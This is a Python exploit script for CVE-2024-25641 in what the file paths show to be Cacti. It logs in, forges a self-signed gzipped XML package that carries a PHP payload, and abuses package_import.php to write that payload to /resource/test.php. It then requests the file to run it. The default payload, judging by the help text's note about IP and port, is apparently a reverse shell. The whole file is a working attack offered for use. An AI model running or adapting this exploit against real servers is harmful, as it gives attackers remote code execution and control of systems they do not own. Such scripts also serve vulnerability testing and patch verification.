import sys, os, requests, base64, gzip
from bs4 import BeautifulSoup
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives import serialization
import argparse

# Variables

parser = argparse.ArgumentParser(description='''Automate the process of exploiting the CVE-2024-25641. Created by: 5ma1l''')
parser.add_argument('URL',type=str,help='vulnerable website')
parser.add_argument('username',type=str,help='login username')
parser.add_argument('password',type=str,help='login password')
parser.add_argument('-p','--payload',type=str,help='PHP payload path. \
 Default is php/monkey.php, don\'t forget to change the ip & port manually!',default='./php/monkey.php')
args = parser.parse_args()

URL = args.URL
username = args.username
password = args.password
filename = args.payload

# Login
s = requests.Session()
r = s.get(URL)

sp = BeautifulSoup(r.text, 'html.parser')
htlm_input = sp.find('input',{'name':'__csrf_magic'})
csrf = htlm_input.get('value')

data = {
    '__csrf_magic': csrf,
    'action': 'login',
    'login_username': username,
    'login_password': password,
    'remember_me': 'on'
    }
login_path = '/index.php'

r = s.post(URL + login_path,data=data)

# Prepare the malicious gzip
xmldata = """<xml>
   <files>
       <file>
           <name>resource/test.php</name>
           <data>{}</data>
           <filesignature>{}</filesignature>
       </file>
   </files>
   <publickey>{}</publickey>
   <signature></signature>
</xml>"""

with open(filename) as data:
    filedata = data.read()

keypair = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
)

public_key = keypair.public_key().public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

filesignature = keypair.sign(
    filedata.encode('utf-8'),
    padding.PKCS1v15(),
    hashes.SHA256()
)

data = xmldata.format(
    base64.b64encode(filedata.encode('utf-8')).decode('utf-8'),
    base64.b64encode(filesignature).decode('utf-8'),
    base64.b64encode(public_key).decode('utf-8')
)

signature = keypair.sign(
    data.encode('utf-8'),
    padding.PKCS1v15(),
    hashes.SHA256()
)

final_data = data.replace("<signature></signature>", f"<signature>{base64.b64encode(signature).decode('utf-8')}</signature>")
final_data = final_data.encode('utf-8')

with open('poc.xml.gz','wb') as poc:
    poc.write(gzip.compress(final_data))

# Exploit
import_post1 = '/package_import.php?package_location=0&preview_only=on&remove_orphans=on&replace_svalues=on'
import_post2 = '/package_import.php?header=false'

## First Post => upload
files = {'import_file': open('poc.xml.gz','rb')}
data = {
    '__csrf_magic': csrf,
    'trust_signer': 'on',
    'save_component_import': 1,
    'action': 'save'
    }

r = s.post(URL + import_post1, data=data, files=files)

## Second Post => confirm the upload
soup = BeautifulSoup(r.text,'html.parser')
htlm_input = soup.find('input',{'title':'/var/www/html/cacti/resource/test.php'})
file_id = htlm_input.get('id')

data = {
    '__csrf_magic': csrf,
    'trust_signer':'on',
    'data_source_profile':1,
    'remove_orphans':'on',
    'replace_svalues':'on',
    file_id: 'on',
    'save_component_import':1,
    'preview_only': '',
    'action':'save',
}

r = s.post(URL + import_post2, data=data)

## Payload Running...
file_path = '/resource/test.php'
option = input('Do you wanna start the payload ?[Y/n]')

if option.lower() == 'y':
    print('Payload is running...')
    r = s.get(URL + file_path)
else:
    print('You will find the payload in',URL + file_path)

